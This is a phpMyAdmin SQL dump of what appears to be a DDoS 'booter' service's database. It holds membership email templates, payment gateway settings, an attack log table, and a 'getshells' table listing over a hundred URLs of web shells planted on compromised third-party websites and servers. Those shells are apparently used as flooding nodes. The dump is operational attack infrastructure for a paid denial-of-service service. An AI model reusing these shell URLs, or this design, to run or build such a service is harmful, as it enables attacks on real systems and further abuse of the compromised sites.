-- phpMyAdmin SQL Dump
-- version 3.4.3.2
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Sep 06, 2011 at 01:11 PM
-- Server version: 5.1.56
-- PHP Version: 5.2.6

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `legionbo_booter`
--

-- --------------------------------------------------------

--
-- Table structure for table `email_templates`
--

CREATE TABLE IF NOT EXISTS `email_templates` (
  `id` int(5) NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `subject` varchar(255) NOT NULL,
  `help` text,
  `body` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=15 ;

--
-- Dumping data for table `email_templates`
--

INSERT INTO `email_templates` (`id`, `name`, `subject`, `help`, `body`) VALUES
(1, 'Registration Email', 'Please verify your email', 'This template is used to send Registration Verification Email, when Configuration->Registration Verification is set to YES', '&lt;div align=&quot;center&quot;&gt;\n&lt;table cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; width=&quot;600&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Welcome [NAME]! Thanks for registering.&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;Hello,&lt;br /&gt;\n            &lt;br /&gt;\n            You&#039;re now a member of [SITE_NAME].&lt;br /&gt;\n            &lt;br /&gt;\n            Here are your login details. Please keep them in a safe place:&lt;br /&gt;\n            &lt;br /&gt;\n            Username: &lt;strong&gt;[USERNAME]&lt;/strong&gt;&lt;br /&gt;\n            Password: &lt;strong&gt;[PASSWORD]&lt;/strong&gt;         &lt;hr /&gt;\n            The administrator of this site has requested all new accounts&lt;br /&gt;\n            to be activated by the users who created them thus your account&lt;br /&gt;\n            is currently inactive. To activate your account,&lt;br /&gt;\n            please visit the link below and enter the following:&lt;hr /&gt;\n            Token: &lt;strong&gt;[TOKEN]&lt;/strong&gt;&lt;br /&gt;\n            Email: &lt;strong&gt;[EMAIL]&lt;/strong&gt;         &lt;hr /&gt;\n            &lt;a href=&quot;[LINK]&quot;&gt;Click here to activate tour account&lt;/a&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n            [SITE_NAME] Team&lt;br /&gt;\n            &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(2, 'Forgot Password Email', 'Password Reset', 'This template is used for retrieving lost user password', '&lt;div align=&quot;center&quot;&gt;\n&lt;table width=&quot;600&quot; cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;New password reset from [SITE_NAME]!&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;Hello, &lt;strong&gt;[USERNAME]&lt;/strong&gt;&lt;br /&gt;\n            &lt;br /&gt;\n            It seems that you or someone requested a new password for you.&lt;br /&gt;\n            We have generated a new password, as requested:&lt;br /&gt;\n            &lt;br /&gt;\n            Your new password: &lt;strong&gt;[PASSWORD]&lt;/strong&gt;&lt;br /&gt;\n            &lt;br /&gt;\n            To use the new password you need to activate it. To do this click the link provided below and login with your new password.&lt;br /&gt;\n            &lt;a href=&quot;[LINK]&quot;&gt;[LINK]&lt;/a&gt;&lt;br /&gt;\n            &lt;br /&gt;\n            You can change your password after you sign in.&lt;hr /&gt;\n            Password requested from IP: [IP]&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n            [SITE_NAME] Team&lt;br /&gt;\n            &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(3, 'Welcome Mail From Admin', 'You have been registered', 'This template is used to send welcome email, when user is added by administrator', '&lt;div align=&quot;center&quot;&gt;\n&lt;table cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; width=&quot;600&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Welcome [NAME]! You have been Registered.&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;Hello,&lt;br /&gt;\n            &lt;br /&gt;\n            You&#039;re now a member of [SITE_NAME].&lt;br /&gt;\n            &lt;br /&gt;\n            Here are your login details. Please keep them in a safe place:&lt;br /&gt;\n            &lt;br /&gt;\n            Username: &lt;strong&gt;[USERNAME]&lt;/strong&gt;&lt;br /&gt;\n            Password: &lt;strong&gt;[PASSWORD]&lt;/strong&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n            [SITE_NAME] Team&lt;br /&gt;\n            &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(4, 'Default Newsletter', 'Newsletter', 'This is a default newsletter template', '&lt;div align=&quot;center&quot;&gt;\n&lt;table width=&quot;600&quot; cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Hello [NAME]!&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;You are receiving this email as a part of your newsletter subscription.         &lt;hr /&gt;\n            Here goes your newsletter content         &lt;hr /&gt;\n            &lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n            [SITE_NAME] Team&lt;br /&gt;\n            &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;         &lt;hr /&gt;\n            &lt;span style=&quot;font-size: 11px;&quot;&gt;&lt;em&gt;To stop receiving future newsletters please login into your account         and uncheck newsletter subscription box.&lt;/em&gt;&lt;/span&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(5, 'Transaction Completed', 'Payment Completed', 'This template is used to notify administrator on successful payment transaction', '&lt;div align=&quot;center&quot;&gt;\n&lt;table width=&quot;600&quot; cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Hello, Admin&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;You have received new payment following:&lt;br /&gt;\n            &lt;br /&gt;\n            Username: &lt;strong&gt;[USERNAME]&lt;/strong&gt;&lt;br /&gt;\n            Membership: &lt;strong&gt;[ITEMNAME]&lt;/strong&gt;&lt;br /&gt;\n            Price: &lt;strong&gt;[PRICE]&lt;/strong&gt;&lt;br /&gt;\n            Status: &lt;strong&gt;[STATUS] &lt;/strong&gt;&lt;br /&gt;\r\n            Processor: &lt;strong&gt;[PP] &lt;/strong&gt;&lt;br /&gt;\n            IP: &lt;strong&gt;[IP] &lt;/strong&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;&lt;em&gt;You can view this transaction from your admin panel&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(6, 'Transaction Suspicious', 'Suspicious Transaction', 'This template is used to notify administrator on failed/suspicious payment transaction', '&lt;div align=&quot;center&quot;&gt;\n&lt;table width=&quot;600&quot; cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color:#ccc&quot;&gt;Hello, Admin&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align:left&quot;&gt;The following transaction has been disabled due to suspicious activity:&lt;br /&gt;\n            &lt;br /&gt;\n            Buyer: &lt;strong&gt;[USERNAME]&lt;/strong&gt;&lt;br /&gt;\n            Item: &lt;strong&gt;[ITEM]&lt;/strong&gt;&lt;br /&gt;\n            Price: &lt;strong&gt;[PRICE]&lt;/strong&gt;&lt;br /&gt;\n            Status: &lt;strong&gt;[STATUS]&lt;/strong&gt;&lt;/td&gt;\r\n            Processor: &lt;strong&gt;[PP] &lt;/strong&gt;&lt;br /&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align:left&quot;&gt;&lt;em&gt;Please verify this transaction is correct. If it is, please activate it in the transaction section of your site&#039;s &lt;br /&gt;\n            administration control panel. If not, it appears that someone tried to fraudulently obtain products from your site.&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(7, 'Welcome Email', 'Welcome', 'This template is used to welcome newly registered user when Configuration->Registration Verification and Configuration->Auto Registration are both set to YES', '&lt;div align=&quot;center&quot;&gt;\n&lt;table width=&quot;600&quot; cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Welcome [NAME]! Thanks for registering.&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;Hello,&lt;br /&gt;\n            &lt;br /&gt;\n            You&#039;re now a member of [SITE_NAME].&lt;br /&gt;\n            &lt;br /&gt;\n            Here are your login details. Please keep them in a safe place:&lt;br /&gt;\n            &lt;br /&gt;\n            Username: &lt;strong&gt;[USERNAME]&lt;/strong&gt;&lt;br /&gt;\n            Password: &lt;strong&gt;[PASSWORD]&lt;/strong&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n            [SITE_NAME] Team&lt;br /&gt;\n            &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(8, 'Membership Expire 7 days', 'Your membership will expire in 7 days', 'This template is used to remind user that membership will expire in 7 days', '&lt;div align=&quot;center&quot;&gt;\n&lt;table cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; width=&quot;600&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Hello, [NAME]&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;\n            &lt;h2 style=&quot;color: rgb(255, 0, 0);&quot;&gt;Your current membership will expire in 7 days&lt;/h2&gt;\n            Please login to your user panel to extend or upgrade your membership.&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n            [SITE_NAME] Team&lt;br /&gt;\n            &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(9, 'Membership Expired Today', 'Your membership has expired', 'This template is used to remind user that membership had expired', '&lt;div align=&quot;center&quot;&gt;\n&lt;table width=&quot;600&quot; cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Hello, [NAME]&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;\n            &lt;h2 style=&quot;color: rgb(255, 0, 0);&quot;&gt;Your current membership has expired!&lt;/h2&gt;\n            Please login to your user panel to extend or upgrade your membership.&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n            [SITE_NAME] Team&lt;br /&gt;\n            &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(10, 'Contact Request', 'Contact Inquiry', 'This template is used to send default Contact Request Form', '&lt;div align=&quot;center&quot;&gt;\n&lt;table width=&quot;600&quot; cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Hello Admin&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;You have a new contact request:         &lt;hr /&gt;\n            [MESSAGE]         &lt;hr /&gt;\n            From: &lt;strong&gt;[SENDER] - [NAME]&lt;/strong&gt;&lt;br /&gt;\n            Subject: &lt;strong&gt;[MAILSUBJECT]&lt;/strong&gt;&lt;br /&gt;\n            Senders IP: &lt;strong&gt;[IP]&lt;/strong&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(12, 'Single Email', 'Single User Email', 'This template is used to email single user', '&lt;div align=&quot;center&quot;&gt;\n  &lt;table width=&quot;600&quot; cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n      &lt;tr&gt;\n        &lt;th style=&quot;background-color:#ccc&quot;&gt;Hello [NAME]&lt;/th&gt;\n      &lt;/tr&gt;\n      &lt;tr&gt;\n        &lt;td valign=&quot;top&quot; style=&quot;text-align:left&quot;&gt;Your message goes here...&lt;/td&gt;\n      &lt;/tr&gt;\n      &lt;tr&gt;\n        &lt;td style=&quot;text-align:left&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n          [SITE_NAME] Team&lt;br /&gt;\n          &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;\n      &lt;/tr&gt;\n    &lt;/tbody&gt;\n  &lt;/table&gt;\n&lt;/div&gt;'),
(13, 'Notify Admin', 'New User Registration', 'This template is used to notify admin of new registration when Configuration->Registration Notification is set to YES', '&lt;div align=&quot;center&quot;&gt;\n&lt;table cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; width=&quot;600&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Hello Admin&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;You have a new user registration. You can login into your admin panel to view details:&lt;hr /&gt;\n            Username: &lt;strong&gt;[USERNAME]&lt;/strong&gt;&lt;br /&gt;\n            Name: &lt;strong&gt;[NAME]&lt;/strong&gt;&lt;br /&gt;\n            IP: &lt;strong&gt;[IP]&lt;/strong&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;'),
(14, 'Registration Pending', 'Registration Verification Pending', 'This template is used to send Registration Verification Email, when Configuration->Auto Registration is set to NO', '&lt;div align=&quot;center&quot;&gt;\n&lt;table cellspacing=&quot;5&quot; cellpadding=&quot;5&quot; border=&quot;0&quot; width=&quot;600&quot; style=&quot;background: none repeat scroll 0% 0% rgb(244, 244, 244); border: 1px solid rgb(102, 102, 102);&quot;&gt;\n    &lt;tbody&gt;\n        &lt;tr&gt;\n            &lt;th style=&quot;background-color: rgb(204, 204, 204);&quot;&gt;Welcome [NAME]! Thanks for registering.&lt;/th&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td valign=&quot;top&quot; style=&quot;text-align: left;&quot;&gt;Hello,&lt;br /&gt;\n            &lt;br /&gt;\n            You&#039;re now a member of [SITE_NAME].&lt;br /&gt;\n            &lt;br /&gt;\n            Here are your login details. Please keep them in a safe place:&lt;br /&gt;\n            &lt;br /&gt;\n            Username: &lt;strong&gt;[USERNAME]&lt;/strong&gt;&lt;br /&gt;\n            Password: &lt;strong&gt;[PASSWORD]&lt;/strong&gt;         &lt;hr /&gt;\n            The administrator of this site has requested all new accounts&lt;br /&gt;\n            to be activated by the users who created them thus your account&lt;br /&gt;\n            is currently pending verification process.&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td style=&quot;text-align: left;&quot;&gt;&lt;em&gt;Thanks,&lt;br /&gt;\n            [SITE_NAME] Team&lt;br /&gt;\n            &lt;a href=&quot;[URL]&quot;&gt;[URL]&lt;/a&gt;&lt;/em&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n&lt;/div&gt;');

-- --------------------------------------------------------

--
-- Table structure for table `gateways`
--

CREATE TABLE IF NOT EXISTS `gateways` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `displayname` varchar(255) NOT NULL,
  `dir` varchar(255) NOT NULL,
  `demo` tinyint(1) NOT NULL DEFAULT '1',
  `extra_txt` varchar(255) NOT NULL,
  `extra_txt2` varchar(255) NOT NULL,
  `extra_txt3` varchar(255) DEFAULT NULL,
  `extra` varchar(255) NOT NULL,
  `extra2` varchar(255) NOT NULL,
  `extra3` varchar(255) DEFAULT NULL,
  `is_recurring` tinyint(1) NOT NULL DEFAULT '0',
  `active` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `gateways`
--

INSERT INTO `gateways` (`id`, `name`, `displayname`, `dir`, `demo`, `extra_txt`, `extra_txt2`, `extra_txt3`, `extra`, `extra2`, `extra3`, `is_recurring`, `active`) VALUES
(1, 'paypal', 'PayPal', 'paypal', 1, 'Paypal Email Address', 'Currency Code', 'Not in Use', 'hfdeceive@hotmail.com', 'USD', '', 1, 1),
(2, 'moneybookers', 'MoneyBookers', 'moneybookers', 0, 'MoneyBookers Email Address', 'Currency Code', 'Secret Passphrase', 'moneybookers@address.com', 'EUR', 'mypassphrase', 1, 0);

-- --------------------------------------------------------

--
-- Table structure for table `getshells`
--

CREATE TABLE IF NOT EXISTS `getshells` (
  `URL` varchar(1000) NOT NULL,
  `online` int(1) NOT NULL DEFAULT '0',
  `lastChecked` int(10) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `getshells`
--

INSERT INTO `getshells` (`URL`, `online`, `lastChecked`) VALUES
('http://www.filbanken.nu/awstats/awstats/UDP.php', 0, 0),
('http://www.indianethicalhacker.blackapplehost.com/xoep.php?', 0, 0),
('http://www.indianethicalhacker.blackapplehost.com/xoep.php ', 0, 0),
('http://www.indianethicalhacker.blackapplehost.com/xoep.php	', 0, 0),
('http://163.178.170.74/webdav/greenshell.php', 0, 0),
('http://mapi.co.kr/zb41pl7/bbs/data/mapi_bbs/settings.php', 0, 0),
('http://indianethicalhacker.blackapplehost.com/xoep.php?act=phptools&amp;host=/', 0, 0),
('http://theresahackforthat.webs.com/shell.php', 0, 0),
('http://www.ecofilms.gr/search_gr.asp', 0, 0),
('http://mmx1.webs.com/shell.php', 0, 0),
('http://mmx2.webs.com/shell.php', 0, 0),
('http://www.ecofilms.gr/search_gr.asp		', 0, 0),
('http://gfdgdfgfdgfd.co.cc/shell.php', 0, 0),
('http://localhostr.t35.com/udp/	', 0, 0),
('http://shells.red-pill.eu', 0, 0),
('http://shells.red-pill.eu/', 0, 0),
('http://204.191.9.89/webdav/shell16182.php', 0, 0),
('http://www.ecofilms.gr/search_gr.asp?', 0, 0),
('http://www.theresahackforthat.webs.com/shell.php', 0, 0),
('http://www.gfdgdfgfdgfd.co.cc/shell.php', 0, 0),
('http://www.ecofilms.gr/search_gr.asp?act=phptools&amp;.../', 0, 0),
('http://www.ecofilms.gr/search_gr.asp?act...ols', 0, 0),
('http://82.114.168.38/webdav/greenshell.php', 0, 0),
('http://www.indianethicalhacker.blackapplehost.com/xoep.php', 0, 0),
('http://www.indianethicalhacker.blackapplehost.com/xoep.php?act=phptools&amp;host=/', 0, 0),
('http://www.ecofilms.gr/search_gr.asp?act...ols&amp;host=/', 0, 0),
('http://www.ecofilms.gr/search_gr.asp?act=phptools&amp;...', 0, 0),
('http://shells.red-pill.eu/ ', 0, 0),
('http://115.111.3.241/webdav/test.php', 0, 0),
('http://www.windowsecurity.com/faqs/Trojans/', 0, 0),
('http://www.ecofilms.gr/search_gr.asp?act=phptools', 0, 0),
('http://www.ecofilms.gr/search_gr.asp ', 0, 0),
(' http://82.114.168.38/webdav/greenshell.php', 0, 0),
('http://www.ecofilms.gr/search_gr.asp	', 0, 0),
('http://212.41.203.123/webdav/...php', 0, 0),
('http://www.offensive-security.com/metasploit-unleashed/Antivirus_Bypass', 0, 0),
(' http://www.indianethicalhacker.blackapplehost.com/xoep.php', 0, 0),
('http://www.ecofilms.gr/search_gr.asp?act=phptools/', 0, 0),
('http://212.182.69.18/webdav/panel.php', 0, 0),
('http://217.92.11.24/webdav/.....php', 0, 0),
('http://88.37.32.82/webdav/shell.php', 0, 0),
('http://88.37.32.86/webdav/shell.php', 0, 0),
('http://82.114.168.38/webdav/greenshell.php?act=phptools&amp;host=/', 0, 0),
('http://208.105.232.221/webdav/sectorx/udp.php', 0, 0),
('http://laentrada.com.mx/images/laentrada/0x.php', 0, 0),
('http://www.sargodhanews.com/ads/0x.php', 0, 0),
('http://94.76.206.41/~mega/pek/0x.php', 0, 0),
('http://www.pakistaniscandals.com/ads/0x.php', 0, 0),
('http://spicyscandals.com/posts/0x.php', 0, 0),
('http://johnbaptistchurch.org/0x.php', 0, 0),
('http://www.starwelfare.org/banners/0x.php', 0, 0),
('http://www.thehealthmag.com/editor-images/0x.php', 0, 0),
('http://lajefa.fm/9odzx/0x.php', 0, 0),
('http://colmexreuma.org.mx/curso_internacional/0x.php', 0, 0),
('http://inglesaustralia.com/0x.php', 0, 0),
('http://joomlaedge.com/upload/0x.php', 0, 0),
('https://www.localoyb.com/webadmin/videos/0x.php', 0, 0),
('http://teamunic.com/0x.php', 0, 0),
('http://websad.ru/dump/0x.php', 0, 0),
('http://pizzarma.com/0x.php', 0, 0),
('http://offcourseclothing.com/0x.php', 0, 0),
('http://www.aldaindia.com/0x.php', 0, 0),
('http://80.98.58.55/webdav/ab.php', 0, 0),
('http://80.152.166.212/webdav/ab.php', 0, 0),
('http://www.pmfoz.com.br/0x.php', 0, 0),
('http://gazteplo.ru/img/brands/0x.php', 0, 0),
('http://80.14.62.174/webdav/ab.php', 0, 0),
('http://bailey-button.org/x.php', 0, 0),
('http://www.marpit.pl/x.php', 0, 0),
('http://www.sadoun.net/0x.php', 0, 0),
('http://expertisepc.com/df/x.php', 0, 0),
('http://25uw05y0b.site.aplus.net/stats/x.php', 0, 0),
('http://smart.wei-dong.com/tmp/x.php', 0, 0),
('http://www.korenyzdravi.cz/wp-admin/x.php', 0, 0),
('http://mahatour.co.id/administrator/x.php', 0, 0),
('http://portal.bakerhughes.de/images/x.php', 0, 0),
('http://bfaaa.net/x.php', 0, 0),
('http://www.christinamultimedia.com/forum/YaBBHelp/x.php', 0, 0),
('http://umutlu.bel.tr/yonetim/x.php', 0, 0),
('http://redimpex.com/upload/x.php', 0, 0),
('http://91.201.211.33/webdav/ab.php', 0, 0),
('http://www.pureearthenergy.com.au/art/x.php', 0, 0),
('http://revistavoto.com.br/site/xml/x.php', 0, 0),
('http://bia2tak.com/includes/plugin/x.php', 0, 0),
('http://tienda-aerografia.com/x.php', 0, 0),
('http://91.217.254.134/webdav/ab.php', 0, 0),
('http://aksharakashaayam.com/x.php', 0, 0),
('http://www.mylilygirl.com/photos/tpl_c/x.php', 0, 0),
('http://kerchopine.com/img/x.php', 0, 0),
('http://www.isabellafiore.net/x.php', 0, 0),
('http://vietsohoa.net/phpbasic_modules/user/search/x.php', 0, 0),
('http://azarhosting.com/templates/beez/x.php', 0, 0),
('http://allia-soft.com/forum/cache/.svn/tmp/props/x.php', 0, 0),
('http://shortyandtheboyz.com/x.php', 0, 0),
('http://www.sachdevfitness.com/x.php', 0, 0),
('http://www.saipayadak.org/book/files/image/x.php', 0, 0),
('http://www.alfagaia.com.br/areacliente/denso/x.php', 0, 0),
('http://arlindocruz.com.br/loja/x.php', 0, 0),
('http://jamgsm.net/up1/images/x.php', 0, 0),
('http://esarn-chicago.com/UserFiles/File/x.php', 0, 0),
('http://217.16.9.102/~atelie96/i/upload/users/x.php', 0, 0),
('http://tourdelanostalgia.com/x.php', 0, 0),
('http://www.care-vision.co.il/files/wordocs/x.php', 0, 0),
('http://work.decoyinternational.com/littled/tmp/x.php', 0, 0),
('http://www.daradaily.com/content/highlight/x.php', 0, 0),
('http://www.autlancasas.com/categoria/images/x.php', 0, 0),
('http://juststeppingforward.net/zen/x.php', 0, 0),
('http://cutebabyvids.com/x.php', 0, 0),
('http://idealhome.ir/x.php', 0, 0),
('http://hostedwebsiteconcept.com/website_logo/x.php', 0, 0),
('http://216.158.128.200/webdav/jboot.php', 0, 0),
('http://giahung-jsc.com/x.php', 0, 0),
('http://cwa3672.org/ulogs.php', 0, 0),
('http://shopmientrung.com/includes/x.php', 0, 0),
('http://85.17.159.77/~jbooter/whmcs/shell.php', 0, 0),
('http://www.klccab.gov.tw/admin/Auth/x.php', 0, 0),
('http://sanacyapidenetim.com/tmp/x.php', 0, 0),
('http://sakon2.go.th/personal/calendardata/x.php', 0, 0),
('http://www.infohouseavare.com/product_downloads/x/x.php', 0, 0),
('http://208.105.232.221/webdav/sectorx/udp.php ', 0, 0),
('http://120.127.14.41/webdav/greenshell.php', 0, 0),
('http://www.paylizard.com/scripts/x.php', 0, 0),
('http://gamecastel.info/2.php', 0, 0),
('http://www.civitas.ru/subscribe/0x.php', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `logs`
--

CREATE TABLE IF NOT EXISTS `logs` (
  `username` text NOT NULL,
  `ip` text NOT NULL,
  `time` text NOT NULL,
  `port` text NOT NULL,
  `date` varchar(100) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `logs`
--

